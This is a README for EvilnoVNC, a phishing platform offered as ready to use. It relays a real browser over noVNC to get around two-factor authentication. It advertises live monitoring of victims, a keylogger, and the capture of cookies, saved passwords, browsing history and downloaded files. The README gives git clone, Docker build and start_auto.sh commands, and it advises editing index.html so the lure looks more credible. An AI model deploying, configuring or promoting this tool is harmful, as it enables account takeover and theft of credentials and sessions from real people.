# EvilnoVNC
**EvilnoVNC** is a Ready to go Phishing Platform. 

Unlike other phishing techniques, EvilnoVNC allows 2FA bypassing by using a real browser over a noVNC connection.

In addition, this tool allows us to see in real time all of the victim's actions, access to their downloaded files and the entire browser profile, including cookies, saved passwords, browsing history and much more.


# Requirements
- Docker


# Installation

It's recommended to clone the complete repository or download the zip file.
Additionally, it's necessary to build Docker manually. You can do this by running the following commands:

## Auto

```bash
git clone https://github.com/wanetty/EvilnoVNC
cd EvilnoVNC
make build
```
## Manual

```
git clone https://github.com/wanetty/EvilnoVNC
cd EvilnoVNC ; sudo chown -R 103 Downloads
sudo docker build -f evilnovnc.Dockerfile -t evilnovnc .
sudo docker build -f nginx.Dockerfile -t evilnginx .
```

## Cleanup

If you want to remove the automatically built docker images on your system simply run the following commands.

```bash
make clean
```

# Usage MultiServer

```bash
./start_auto.sh $url
```

If you want to make it more credible, modify the index.html by adapting the js code.

You will find the cookies and the keylogger output inside the Downloads folder in its corresponding id.
